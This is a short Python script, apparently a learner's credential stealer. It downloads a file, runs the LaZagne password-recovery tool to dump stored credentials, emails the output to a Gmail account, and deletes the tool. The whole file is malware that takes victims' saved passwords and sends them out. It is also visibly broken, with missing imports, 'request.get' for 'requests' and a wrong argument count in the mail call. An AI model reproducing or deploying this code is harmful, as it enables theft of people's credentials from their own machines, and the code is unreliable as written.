#!/usr/bin/env python
import requests

def download(url):
    get_response = request.get(url)
    file_name = url.split("-/-")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://vignette.wikia.nocookie.net/villains/images/2/26/BobPage.png/revision/latest?cb=20120705072505")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("BobPage12@gmail.com, abc123abc12", result)
os.remove("laZagne.exe")